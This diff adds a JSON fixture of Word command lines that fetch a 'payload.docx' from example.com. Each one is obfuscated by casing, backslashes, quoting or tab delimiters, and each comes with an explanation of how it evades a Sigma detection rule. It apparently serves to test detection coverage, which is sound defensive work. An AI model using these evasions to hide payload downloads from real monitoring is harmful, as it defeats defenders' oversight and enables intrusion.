@@ -1,0 +1,22 @@
+[
+  {
+    "output": "WINWORD.EXE HttPs://example.com/payload.docx",
+    "explanation": "Substitution technique. Modifies the character casing of the URL protocol scheme to mixed case ('HttPs://'). The Sigma rule uses a standard `CommandLine|contains` field to search for the literal lowercase strings 'http://' and 'https://'. If the SIEM platform or backend log parser processes string filters case-sensitively by default, this variation avoids detection while the Windows web components evaluate network protocol schemes case-insensitively."
+  },
+  {
+    "output": "WINWORD.EXE https:\\\\example.com\\payload.docx",
+    "explanation": "Substitution technique. Replaces the standard URL forward slashes (`//`) following the scheme with backslashes (`\\\\`). This alters the literal string sequence to completely evade matching the required `https://` or `http://` entries inside the `selection_http` condition array, while the underlying Windows URLMON and WinINet subsystem libraries automatically normalize backslash directions back to standard web links during remote resource resolution."
+  },
+  {
+    "output": "WINWORD.EXE \"https://example.com/payload.docx\"",
+    "explanation": "Insertion technique. Encloses the target URL argument within double quotation marks. Although the raw process telemetry string still contains the sequential characters, this shifts the token boundaries, which is designed to subvert brittle custom regular expressions, strict positional lookahead indexing, or fixed token-distance parameters."
+  },
+  {
+    "output": "WINWORD.EXE\thttps://example.com/payload.docx",
+    "explanation": "Insertion technique. Replaces the standard space delimiter between the binary name and the target link argument with a horizontal tab (`\t`) character. The Windows process execution framework seamlessly parses tabs as valid parameter separators, but it breaks simple substring containment rules that rely on standard space boundaries to isolate file tokens."
+  },
+  {
+    "output": "",
+    "explanation": "Omission technique note: Complete omission or heavy encoding of the protocol scheme prefix (such as hiding the scheme name via environment variables directly on the native shell command line string block) cannot be safely simulated because the internal argument handling routines of Microsoft Office applications strictly depend on identifying explicit scheme prefixes to route the retrieval process over network vectors."
+  }
+]
